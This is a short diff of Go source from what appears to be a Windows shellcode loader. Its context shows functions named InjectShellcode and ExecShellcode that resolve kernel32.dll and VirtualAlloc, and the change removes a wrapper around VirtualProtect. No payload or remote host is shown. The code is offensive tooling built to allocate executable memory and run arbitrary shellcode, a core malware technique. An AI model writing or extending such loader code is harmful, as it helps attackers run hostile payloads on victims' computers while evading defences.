@@ -39,17 +39,6 @@ func InjectShellcode(encShellcode string) {
 	}
 }
 
-var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
-
-func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
-	ret, _, _ := procVirtualProtect.Call(
-		uintptr(lpAddress),
-		uintptr(dwSize),
-		uintptr(flNewProtect),
-		uintptr(lpflOldProtect))
-	return ret > 0
-}
-
 func ExecShellcode(shellcode []byte) {
 	// Resolve kernell32.dll, and VirtualAlloc
 	kernel32 := syscall.MustLoadDLL("kernel32.dll")
